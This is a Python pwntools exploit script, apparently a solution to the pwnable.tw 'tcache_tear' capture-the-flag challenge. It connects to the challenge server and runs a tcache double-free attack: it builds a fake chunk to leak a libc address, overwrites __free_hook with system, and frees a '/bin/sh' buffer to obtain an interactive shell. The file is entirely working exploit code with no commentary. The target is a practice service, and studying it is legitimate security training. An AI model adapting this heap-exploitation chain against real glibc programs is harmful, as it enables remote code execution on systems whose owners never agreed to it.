from pwn import *


#io = process('./tcache_tear', env={"LD_PRELOAD":"./libc-2.27.so"})
io = remote('chall.pwnable.tw', 10207)
libc = ELF('./libc-2.27.so')
#io = process('./tcache_tear')


def malloc(size, data):
    print(io.recvuntil('Your choice :'))
    io.sendline(b'1')
    print(io.recvuntil('Size:'))
    io.sendline(str(size))
    print(io.recvuntil('Data:'))
    io.send(data)


def free():
    print(io.recvuntil('Your choice :'))
    io.sendline(b'2')

def info():
    print(io.recvuntil('Your choice :'))
    io.sendline(b'3')

print(io.recvuntil('Name:'))
io.send(b'\0')

malloc(15, b'TRASH1')
free()
free()
malloc(15, p64(0x602060-0x10))
malloc(15, b'HAHA')
payload = p64(0)+p64(0x501)+(0x500-0x10)*b'\0'+p64(0)+p64(0x21)+(0x20-0x10)*b'\0'+p64(0)+p64(0x20d41)
malloc(15, payload)

malloc(30, b'TRASH2')
free()
free()
malloc(30, p64(0x602060))
malloc(30, b'HAHA')
malloc(30, b'PWNED!!!')
free()
info()
print(io.recvuntil(b'Name :'))
libc.address = u64(io.recv(6)+b'\0\0') - 0x3ebca0
log.info('LIBC BASE: '+hex(libc.address))

malloc(50, b'TRASH3')
free()
free()
malloc(50, p64(libc.sym['__free_hook']))
malloc(50, b'HAHA')
malloc(50, p64(libc.sym['system']))

malloc(100, b'/bin/sh')
free()
io.interactive()
